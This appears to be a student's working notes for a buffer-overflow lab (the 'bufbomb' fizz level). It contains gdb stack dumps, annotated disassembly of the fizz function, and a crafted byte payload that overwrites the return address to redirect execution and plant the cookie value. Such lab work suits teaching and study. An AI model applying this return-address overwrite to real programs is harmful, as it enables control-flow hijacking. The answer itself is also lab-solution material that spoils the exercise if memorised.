(gdb) x/15gx 0x7fffffffbc30
0x7fffffffbc30: 0x0000006161616161  0x00007fffffffe230
0x7fffffffbc40: 0x0000000000607f80  0x0000003dd52148e5
0x7fffffffbc50: 0x0000000000002550  0x0000003dd56ba477
0x7fffffffbc60: 0x00007fffffffbc90  0x0000000000400ef3
0x7fffffffbc70: 0x00007fffffffbca0  0x00000000deadbeef
0x7fffffffbc80: 0x0000003dd59b0120  0x000000003a8f0352
0x7fffffffbc90: 0x00007fffffffe230  0x0000000000400fdd
0x7fffffffbca0: 0xf4f4f4f4f4f4f4f4

# Stack pointer before space is allocated in the stack for the call to getbuf:
# 0x7fffffffbc88

# Return address for continuation of test function
(gdb) info stack
#0  getbuf () at bufbomb.c:137
#1  0x0000000000400ef3 in test () at bufbomb.c:108
#2  0x0000000000400fdd in launch (offset=offset@entry=848, nitro=0) at bufbomb.c:343
#3  0x0000000000400a59 in main (argc=3, argv=<optimized out>) at bufbomb.c:454


# Return address for fizz function:
-bash-4.2$ objdump -x bufbomb | grep fizz
0000000000401070 g     F .text	0000000000000047              fizz


# Assembly for fizz function:
0000000000401070 <fizz>:
  401070:	48 83 ec 08          	sub    $0x8,%rsp   # stack pointer moves to where the 
                                                           # return address initially was 
                                                           # before it was pushed

  401074:	c7 05 32 12 20 00 01 	movl   $0x1,0x201232(%rip)        # 6022b0 <check_level>
  40107b:	00 00 00 
  40107e:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi  # stack pointer moves 16 bytes
                                                                # forward, to where "deadbeef"
                                                                # in hex is stored

  401083:	48 3b 35 96 12 20 00 	cmp    0x201296(%rip),%rsi        # 602320 <cookie>
  40108a:	74 13                	je     40109f <fizz+0x2f>
  40108c:	bf b0 15 40 00       	mov    $0x4015b0,%edi
  401091:	31 c0                	xor    %eax,%eax
  401093:	e8 58 f7 ff ff       	callq  4007f0 <printf@plt>
  401098:	31 ff                	xor    %edi,%edi
  40109a:	e8 21 f8 ff ff       	callq  4008c0 <exit@plt>
  40109f:	bf 90 15 40 00       	mov    $0x401590,%edi
  4010a4:	31 c0                	xor    %eax,%eax
  4010a6:	e8 45 f7 ff ff       	callq  4007f0 <printf@plt>
  4010ab:	bf 01 00 00 00       	mov    $0x1,%edi
  4010b0:	e8 7b fd ff ff       	callq  400e30 <validate>
  4010b5:	eb e1                	jmp    401098 <fizz+0x28>
  4010b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4010be:	00 00 


# Address and value of cookie
(gdb) x/x 0x602320
0x602320 <cookie>:	0x78b8f0b4748c7b53


# Input (in space-separated bytes) is:
# 61 61 61 61 61 61 61 61      61 61 61 61 61 61 61 61
# 20 23 60 00 00 00 00 00      61 61 61 61 61 61 61 61
# 61 61 61 61 61 61 61 61      61 61 61 61 61 61 61 61 
# 90 bc ff ff ff 7f 00 00      70 10 40 00 00 00 00 00
# a0 bc ff ff ff 7f 00 00      53 7b 8c 74 b4 f0 b8 78 // has to be value of the cookie
